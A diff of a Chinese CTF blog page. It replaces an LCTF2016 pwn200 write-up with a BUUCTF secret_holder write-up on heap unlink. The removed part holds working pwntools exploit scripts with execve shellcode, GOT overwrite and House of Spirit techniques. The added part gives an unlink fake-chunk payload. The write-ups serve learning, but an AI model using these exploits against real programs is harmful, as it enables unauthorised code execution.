@@ -77,7 +77,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/12/15/lctf2016-pwn200/"/>
+    <link rel="canonical" href="http://example.com/2025/12/17/buuctf-secret-holder/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -87,14 +87,14 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lctf2016-pwn200">
-<meta property="og:url" content="http://example.com/2025/12/15/lctf2016-pwn200/index.html">
+<meta property="og:title" content="BUUCTF-secret_holder">
+<meta property="og:url" content="http://example.com/2025/12/17/BUUCTF-secret-holder/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-12-15T11:32:34.000Z">
-<meta property="article:modified_time" content="2025-12-15T13:26:40.588Z">
+<meta property="article:published_time" content="2025-12-17T11:19:05.000Z">
+<meta property="article:modified_time" content="2025-12-17T12:02:15.619Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -110,7 +110,7 @@
     
     <title>
         
-            lctf2016-pwn200 | A1ex&#39;s blogs.
+            BUUCTF-secret_holder | A1ex&#39;s blogs.
         
     </title>
 
@@ -380,7 +380,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">lctf2016-pwn200</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">BUUCTF-secret_holder</h1>
 			</div>
 			
 		</div>
@@ -401,15 +401,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-12-15 19:32:34</span>
-        <span class="mobile">2025-12-15 19:32:34</span>
+        <span class="desktop">2025-12-17 19:19:05</span>
+        <span class="mobile">2025-12-17 19:19:05</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-12-15 21:26:40</span>
-            <span class="mobile">2025-12-15 21:26:40</span>
+            <span class="desktop">2025-12-17 20:02:15</span>
+            <span class="mobile">2025-12-17 20:02:15</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -447,80 +447,112 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="Lctf2016-pwn200"><a href="#Lctf2016-pwn200" class="headerlink" title="Lctf2016-pwn200"></a>Lctf2016-pwn200</h1><p>这个有多种解法，一种是直接覆盖某一函数的got表指向shellcode的位置实现getshell，一种是hos</p>
-<h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><p>1.用checksec查看文件属性</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
+			<p>本题主要想考察的知识点为unlink</p>
+<h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><blockquote>
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>在堆中，bins（非fast bin）是以双向链表形式存在，而我们从这个链表中获取一个chunk时，会触发链表节点的删除操作</p>
+<pre class="highlighter-hljs php mCustomScrollbar _mCS_1 mCS-autoHide" highlighted="true" id="pre-Rr2TGN"><div id="mCSB_1" class="mCustomScrollBox mCS-minimal-dark mCSB_vertical_horizontal mCSB_outside" tabindex="0"><div id="mCSB_1_container" class="mCSB_container mCS_x_hidden mCS_no_scrollbar_x" dir="ltr"><code-pre class="code-pre" id="pre-zXdNkc">FD = node->fd;
+BK = node->bk;
+FD->bk = BK;
+BK->fd = FD;
+</code-pre></div></div><div id="mCSB_1_scrollbar_vertical" class="mCSB_scrollTools mCSB_1_scrollbar mCS-minimal-dark mCSB_scrollTools_vertical"><div class="mCSB_draggerContainer"><div id="mCSB_1_dragger_vertical" class="mCSB_dragger"><div class="mCSB_dragger_bar"></div></div><div class="mCSB_draggerRail"></div></div></div></pre>
 
-<p>2.将程序拖入ida，即可发现在read处有问题，v2位于rbp-0x30的位置，而name会读入0x30个字符，且如果读入0x30个字符的话末尾不会有\x00，这样在printf的时候就会顺带leak出rbp的值</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int whoareyou()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 i; // [sp+10h] [bp-40h]@1</span><br><span class="line">  char v2[48]; // [sp+20h] [bp-30h]@2</span><br><span class="line"></span><br><span class="line">  puts(&quot;who are u?&quot;);</span><br><span class="line">  for ( i = 0LL; i &lt;= 47; ++i )		//最多输入48个字符,并保存在v2中</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;v2[i], 1uLL);</span><br><span class="line">    if ( v2[i] == &#x27;\n&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      v2[i] = 0;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%s, welcome to xdctf~\n&quot;, v2);		//打印输出的内容,如果v2没有\n,那么他就会一直读取直到遇到\n</span><br><span class="line">  puts(&quot;give me your id ~~?&quot;);</span><br><span class="line">  read_num_morty();				// 最多输入4个字符并保存在nptr中,并返回其数字,最多4位数</span><br><span class="line">  return givememoney();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>如果我们想往一个地址(target_addr)写入任意值(my_value), 那么我们可以修改chunk的fd和bk分别为target_addr - 0x18, my_value，此时unlink操作就变成了</p>
+<pre class="highlighter-hljs apache mCustomScrollbar _mCS_2 mCS-autoHide" highlighted="true" id="pre-EwABrT"><div id="mCSB_2" class="mCustomScrollBox mCS-minimal-dark mCSB_vertical_horizontal mCSB_outside" tabindex="0"><div id="mCSB_2_container" class="mCSB_container mCS_x_hidden mCS_no_scrollbar_x" dir="ltr"><code-pre class="code-pre" id="pre-2GnD5D">FD = node->fd; // FD = target_addr - 0x18
+BK = node->bk; // BK = my_value
+FD->bk = BK;   // *(target_addr - 0x18 + 0x18) = my_value
+BK->fd = FD;   // *(my_value + 0x10) = target_addr - 0x18
+</code-pre></div></div><div id="mCSB_2_scrollbar_vertical" class="mCSB_scrollTools mCSB_2_scrollbar mCS-minimal-dark mCSB_scrollTools_vertical"><div class="mCSB_draggerContainer"><div id="mCSB_2_dragger_vertical" class="mCSB_dragger"><div class="mCSB_dragger_bar"></div></div><div class="mCSB_draggerRail"></div></div></div></pre>
 
-<p>并且关键点来了，在sub_400A29中，由于重叠的问题，导致能够覆盖地址</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int sub_400A29()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // rdi@1</span><br><span class="line">  char buf; // [sp+0h] [bp-40h]@1</span><br><span class="line">  char *dest; // [sp+38h] [bp-8h]@1		//就是一个在rbp上一个地址</span><br><span class="line"></span><br><span class="line">  dest = (char *)malloc(0x40uLL);		//申请一块内存,并将其指针保存在rbp上一个地址</span><br><span class="line">  puts(&quot;give me money~&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40uLL);	//读取0x40,到&amp;buf,这里会将dest覆盖</span><br><span class="line">  v0 = dest;</span><br><span class="line">  strcpy(dest, &amp;buf);	//将读取的内容拷贝到dest中</span><br><span class="line">  ptr = dest;			//这个dest可以控制,prt可以控制</span><br><span class="line">  return sub_4009C4(v0, &amp;buf);	//	v0可以控制</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>那么现在的思路1：先写入shellcode和目标的got地址到buf这个区域，通过对大小的控制，让got地址覆盖dest的地址，这样当发生strcpy的时候，由于现在dest地址是got地址，因此，就会直接将shellcode复制到指定的got地址，我们选择printf的got，因为程序执行完sub_400A29后，会执行printf</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pwn200&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_got_plt = 0x0000000000602000</span><br><span class="line">shellocde= b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><br><span class="line">name = shellocde + b&quot;A&quot;*(48-len(shellocde))		#就是在输入名称的地方写入shellcode</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;who are u?\n&quot;,name)</span><br><span class="line">p.recvuntil(name)</span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(leak_addr))</span><br><span class="line">offset = 0x50</span><br><span class="line">target_addr = leak_addr - offset   				#根据leak出的地址找到shellcode的地址</span><br><span class="line">print(hex(target_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pl = b&quot;B&quot;*25 + p64(target_addr)  #shellcode</span><br><span class="line">pl += b&quot;A&quot; *24      #(0x40 - 33 - 8 + 1)</span><br><span class="line">pl += p64(0x602018)        #这个是free got的位置</span><br><span class="line"></span><br><span class="line">raw_input(&#x27;#&#x27;)</span><br><span class="line">p.sendline(pl)				#	p1就是buf空间,然后程序会运行strcpy(dest, &amp;buf);将free_got覆盖为shellcode</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<p>接下来是思路2：利用hos 进行getshell，而hos利用需要条件</p>
-<blockquote>
-<p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
-<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
-<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
+<p>如果没有node节点的校验，并且我们拥有(my_value + 0x10)地区的写权限的话（一般都有target_addr的写权限），我们就能实现任意地址写。<br>然而，现实很骨干，开发者们早就注意到了这个漏洞，并在unlink时加入了如下的校验：检查下一个节点的presize和当前节点的size是否相同，且 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code></p>
+<p>加入了这样一个校验机制之后，我们就不能直接达成任意地址写这个目标了。然而，道高一尺魔高一丈，前辈们想出了一种间接任意写的办法。让我们仔细看下这段校验的代码, 令FD &#x3D; &amp;P - 0x18, BK &#x3D; &amp;P - 0x10, 此时</p>
 <ul>
-<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
-<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
-<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
-<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于 <code>av-&gt;system_mem</code>。</li>
-<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
-<li></li>
+<li>FD-&gt;bk &#x3D; P<ul>
+<li>*(FD + 0x18) &#x3D; P</li>
+<li>*(&amp;P - 0x18 + 0x18) &#x3D; *(&amp;P) &#x3D; P</li>
 </ul>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p>
-<p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200217185939.png"
-                     
-                ></p>
-<p>（2）存在可将堆变量指针覆盖指向为可控区域，即上一步中的区域</p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>（1）伪造堆块</p>
-<p>hos的主要意图就是在可控1及可控2构造好数据，将它伪造成一个fastbin。</p>
-<p>（2）覆盖堆指针指向上一步伪造的堆块。</p>
-<p>（3）释放堆块，将伪造的堆块释放入fastbin的单链表里面。</p>
-<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p>
+</li>
+<li>BK-&gt;fd &#x3D; P<ul>
+<li>*(BK + 0x10) &#x3D; P</li>
+<li>*(&amp;P - 0x10 + 0x10) &#x3D; *(&amp;P) &#x3D; P</li>
+</ul>
+</li>
+</ul>
+<p>校验通过，继续执行赋值语句</p>
+<ul>
+<li>FD-&gt;bk &#x3D; BK<ul>
+<li>*(&amp;P - 0x18 + 0x18) &#x3D; &amp;P - 0x10</li>
+<li>P &#x3D; &amp;P - 0x10;</li>
+</ul>
+</li>
+<li>BK-&gt;fd &#x3D; FD<ul>
+<li>*(&amp;P - 0x10 + 0x10) &#x3D; &amp;P - 0x18</li>
+<li>P &#x3D; &amp;P - 0X18;</li>
+</ul>
+</li>
+</ul>
+<p>最终效果为P &#x3D; &amp;P - 0x18, 让我们来个图直观感受一下unlink前后的内存布局变化</p>
 </blockquote>
-<p>buf的大小只有 0x40-0x8 &#x3D; 0x38，但是却读入了0x40字节，会覆盖掉dest的指针，而dest是一个堆指针，这样就满足了HOS利用条件之一 <code>存在可将堆变量指针覆盖指向为可控区域</code></p>
-<p>实际上另一个利用条件在 <code>sub_400A8E函数</code>输入ID的地方也得到了满足，只是由于IDA反编译的一些问题，没有显示出来，但是从汇编界面看的话能够看到程序将rax(里面存放的Myread函数的返回值，也就是咱们输入的ID)里的值存放到了 <code>rbp-0x38</code>的位置。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+------------+-----                                  -</span><br><span class="line">|    ...     | money(0x38) 实际读入0x40，能覆盖dest    ↑</span><br><span class="line">+------------+                               sub_400A29栈帧(0x40)</span><br><span class="line">|    dest    |                                       ↓</span><br><span class="line">+------------+-----                                  -</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----              -</span><br><span class="line">|    ...     |这里占0x18,是别的东西↑</span><br><span class="line">+------------+                   |</span><br><span class="line">|     ID     |           sub_400A8E栈帧(0x50)</span><br><span class="line">+------------+                   |</span><br><span class="line">|    ...     |   name(0x30)      ↓</span><br><span class="line">+------------+-----              -</span><br><span class="line">|     rbp    |   #这个rbp存的值实际上就是下面的rbp_addr，也就是main函数的栈底</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">|    ...     |        main栈帧(0x10)</span><br><span class="line">+------------+&lt;----rbp_addr</span><br></pre></td></tr></table></figure></div>
-
-<p>更清楚一点展示：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">内存地址 (Memory Address)</span><br><span class="line">             |</span><br><span class="line">             v</span><br><span class="line">+=========================================+  &lt;-- 栈底 (High Address)</span><br><span class="line">|                                         |</span><br><span class="line">|           main 函数的栈帧                |</span><br><span class="line">|       (Stack Frame for main)            |</span><br><span class="line">|                                         |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Return Address (返回 main)              |  1. main 调用 call 指令时压入</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Saved RBP (main&#x27;s RBP)                 |  2. sub_400A8E 序言 push rbp 压入</span><br><span class="line">+=========================================+  &lt;-- sub_400A8E 的栈底 (概念上)</span><br><span class="line">|                                         |</span><br><span class="line">|         sub_400A8E 的局部变量            |</span><br><span class="line">|       (Local Vars of sub_400A8E)        |</span><br><span class="line">|                                         |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Return Address (返回 sub_400A8E)        |  3. sub_400A8E 调用 call 指令时压入</span><br><span class="line">|  (地址指向 call sub_400A29 的下一条指令)    |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Saved RBP (sub_400A8E&#x27;s RBP)           |  4. sub_400A29 序言 push rbp 压入</span><br><span class="line">+=========================================+  &lt;-- 当前 RBP 寄存器指向这里！</span><br><span class="line">|                                         |</span><br><span class="line">|         sub_400A29 的局部变量            |</span><br><span class="line">|       (Local Vars of sub_400A29)        |</span><br><span class="line">|           [ Buffer / 变量 ]              |</span><br><span class="line">|                                         |</span><br><span class="line">+-----------------------------------------+  &lt;-- 当前 RSP 寄存器指向这里！</span><br><span class="line">             |</span><br><span class="line">             v</span><br><span class="line">        栈顶 (Low Address)</span><br></pre></td></tr></table></figure></div>
-
-<p>也就形成了：<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/lctf2016-pwn200/1765801128818.png"
-                      alt="1765801128818"
-                ></p>
-<p>那么整体思路就成了：</p>
-<ol>
-<li>将shellcode输入到name中，通过 <code>off-by-one</code>漏洞打印出来main函数栈底，通过上面结构图能够算出shellcode的地址，选取一个处在money中的位置作为fake_chunk</li>
-<li>在money中伪造堆块size，在id里面输入的是下一个堆块的size(大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于 <code>av-&gt;system_mem</code>)，同时通过堆溢出漏洞覆盖掉dest</li>
-<li>free掉刚才伪造的堆块，使其进入fastbin</li>
-<li>申请堆块，申请出来以后还是在老位置。</li>
-<li>输入数据到刚申请的堆块中，覆盖掉rip，让其指向shellcode，完成劫持，执行shellcode。</li>
+<p>很绕，但是你就记住，使用unlink手法后，你控制的指针p变成了p-0x18</p>
+<p>通过unlink，我们成功让原本指向堆的指针指向了指针上方的一块区域。又由于题目中一般允许让用户对堆的内容重新输入，此时（第一次输入）我们只需要写入 <code>p64(0) * 3 + p64(target_addr)</code>，覆盖掉P的指针, 即可让P指向我们想要写入内容的地址，然后（第二次输入）写入 <code>p64(my_value)</code>，就能实现任意地址写。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这个文件是动态加载的，题目中有三个堆 <code>buf_small</code>, <code>buf_big</code>, <code>buf_huge</code>，用三个变量 <code>init_small</code>, <code>init_big</code>, <code>init_huge</code>来标识是否被使用，在keep方法中，直接用read读取size个字符，并且没有用 <code>\0</code>结束读入的字符串，可能存在信息泄露。在wipe中，没有判断flag就直接free掉了buf，这里是一个double free漏洞。renew方法则是重新给三个堆赋值。</p>
+<blockquote>
+<h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><ol>
+<li>构造fake chunk</li>
+<li>执行unlink</li>
+<li>泄露libc基址</li>
+<li>执行one_gadget</li>
 </ol>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"># p = remote(&#x27;127.0.0.1&#x27;, 7777)</span><br><span class="line">p = process(&#x27;./pwn200&#x27;)</span><br><span class="line"></span><br><span class="line">free_got = 0x0000000000602018</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)</span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += shellcode.ljust(48)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;who are u?\n&#x27;)</span><br><span class="line">p.send(payload)                                         #发送第一个payload,同时获取rbp</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">rbp_addr = u64(p.recvn(6).ljust(8, &#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">shellcode_addr = rbp_addr - 0x50                        #shellcode 的地址</span><br><span class="line">print &quot;shellcode_addr: &quot;, hex(shellcode_addr)</span><br><span class="line">fake_addr = rbp_addr - 0x90                             # 这个就是givememoney的返回地址</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;give me your id ~~?\n&#x27;)</span><br><span class="line">p.sendline(&#x27;32&#x27;)  # id</span><br><span class="line">p.recvuntil(&#x27;give me money~\n&#x27;)</span><br><span class="line"></span><br><span class="line"># data就是chunk中的内容(0x40)     32bytes padding + prev_size + size + padding + fake_addr</span><br><span class="line">data = p64(0)*5 + p64(0x41) + p64(0) + p64(fake_addr)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice : &#x27;)</span><br><span class="line">p.sendline(&#x27;2&#x27;)  # free(fake_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice : &#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)  # checkin malloc(fake_addr) #fake_addr</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;long?&#x27;)</span><br><span class="line">p.sendline(&#x27;48&#x27;)  # 48 + 16 = 64 = 0x40     ptr = malloc(48)</span><br><span class="line">p.recvline(&#x27;48&#x27;)</span><br><span class="line"></span><br><span class="line">data = &#x27;a&#x27; * 24 + p64(shellcode_addr)  #</span><br><span class="line">data = data.ljust(48, &#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice&#x27;)</span><br><span class="line">p.sendline(&#x27;3&#x27;)     #goodbye</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>这里可以结合给出的堆图理解，但是最好是直接在gdb中调试，查看heap的变化</p>
+<blockquote>
+<p>keep(1)<br>wipe(1)<br>keep(2)<br>wipe(1) # double free<br>keep(1) # overlap</p>
+<p>上述代码wipe1执行后，查看heap，会发现big也不见了，逐步调试就会发现，keep2执行时分配的chunk的起始位置就是keep1的位置，因此由于double free 的原因wipe1的时候，wipe了keep2的chunk，此时big 、small都指向同一个位置，再次keep1，分配出一个chunk1</p>
+</blockquote>
+<p>unlink之前需要做一些准备，buf_huge的大小是400000字节，最初的top chunk无法满足，我们需要先alloc一次，（这次会通过mmap分配，并扩大mmap分配的内存阈值），再free掉，再alloc第二次，第二次获取的堆地址才是我们想要的buf_huge地址(和buf_small, buf_big)相邻</p>
+<blockquote>
+<p>keep(3)<br>wipe(3)<br>keep(3)</p>
+<p>首先，第一个keep3执行时，由于glibc全局参数mmap_threshold默认值通常是 <strong>128KB (0x20000)，这时申请的大小为0x40000于是直接调用 <code>mmap</code> 系统调用向内核单独申请一块内存。释放后又重新申请，Glibc 的开发者认为：</strong>“既然程序刚才申请了这么大一块内存，用完又还回来了，说明程序可能经常需要这种大内存。如果每次都用 mmap&#x2F;munmap 系统调用，开销太大了。不如我把阈值调高一点，下次这种大小的内存直接在堆里切给它。”，你进入gdb逐步调试，就会发现，此时在small 和top chunk之间出现了一个0x40000大小的chunk，结构成了small-huge-top。</p>
+<p>注意：small和big的指针都指向同一个地址，但是大小不同</p>
+</blockquote>
+<p>现在我们需要将chunk丢进unsorted bin以便泄漏地址</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">small_ptr = 0x6020b0 # ida静态分析获取</span><br><span class="line">big_ptr = 0x6020a0   # 同上</span><br><span class="line"></span><br><span class="line">payload = p64(0)</span><br><span class="line">payload += p64(0x21)             # fake size</span><br><span class="line">payload += p64(small_ptr - 0x18) # 绕过FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</span><br><span class="line">payload += p64(small_ptr - 0x10) # 同上</span><br><span class="line">payload += p64(0x20)             # huge.pre_size, 绕过chunksize(P) != prev_size (next_chunk(P))</span><br><span class="line">payload += p64(0x61a90)          # huge.size</span><br><span class="line">renew(2, payload)                # 构造fake chunk</span><br><span class="line">wipe(3)                          # 触发unlink</span><br></pre></td></tr></table></figure></div>
 
+<blockquote>
+<p>这里需要解释一下动机，我们知道unlink后你控制的指针-0x18，我们这里的payload构造的逻辑：</p>
+<p>1.设置0x21是因为设置p位，防止进一步向下拓展</p>
+<p>2.0x20，是因为要绕过unlink的大小检查，</p>
+<p>3.0x61a90，设置p位为0，当释放huge的时候，chunk会向下合并</p>
+<p>再说一次，你通过heap看到的地址是chunk的起始地址，而直接调用renew是chunk+0x10的地址</p>
+</blockquote>
+<p>现在我们的small指针指向了small-0x18，接下来我们需要泄漏libc</p>
